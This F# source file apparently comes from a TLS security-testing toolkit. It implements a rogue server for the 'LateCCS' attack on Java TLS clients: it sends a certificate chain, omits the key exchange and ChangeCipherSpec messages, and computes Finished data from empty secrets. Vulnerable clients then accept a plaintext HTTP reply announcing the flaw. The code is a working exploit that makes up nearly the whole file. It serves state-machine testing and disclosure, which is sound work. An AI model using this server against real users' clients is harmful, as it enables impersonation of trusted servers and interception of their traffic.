#light "off"

module FlexApps.Attack_JavaLateCCS

open Bytes
open Error
open TLSInfo
open TLSConstants

open FlexTLS
open FlexTypes
open FlexConstants
open FlexConnection
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexCertificateRequest
open FlexCertificateVerify
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets
open FlexAppData



type LateCCS =
    class

    static member server (listening_address:string, ?port:int) : unit =
        let g1 = new UntrustedCert.X509Certificate2("g1.cer") in
        let g2 = new UntrustedCert.X509Certificate2("g2.cer") in
        let g3 = new UntrustedCert.X509Certificate2("g3.cer") in
        let chain = UntrustedCert.x509list_to_chain [g1; g2; g3] in
        let port = defaultArg port FlexConstants.defaultTCPPort in

        while true do
            // Accept TCP connection from the client
            let st,cfg = FlexConnection.serverOpenTcpConnection(listening_address, "", port) in

            // Start typical RSA key exchange
            let st,nsc,fch   = FlexClientHello.receive(st) in

            // Sanity check: our preferred ciphersuite is there
            if not (List.exists (fun cs -> cs = TLS_RSA_WITH_AES_128_CBC_SHA) fch.suites) then
                failwith (perror __SOURCE_FILE__ __LINE__ "No suitable ciphersuite given")
            else

            let fsh = { FlexConstants.nullFServerHello with 
                suite = Some(TLSConstants.TLS_DHE_RSA_WITH_AES_128_CBC_SHA)} in
            let st,nsc,fsh   = FlexServerHello.send(st,fch,nsc,fsh) in
            let log         = fch.payload @| fsh.payload in
            let st, nsc, fc = FlexCertificate.send(st, Server, chain, nsc) in
            let log = log @| fc.payload in
            let verify_data = FlexSecrets.makeVerifyData nsc.si (abytes [||]) Server log in
        
            let st,fin = FlexFinished.send(st,verify_data=verify_data) in
//            let st, req = FlexAppData.receive(st) in
            let st = FlexAppData.send(st,"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 43\r\n\r\nYou are vulnerable to the LateCCS attack!\r\n") in
            Tcp.close st.ns;
            ()
        done
    end
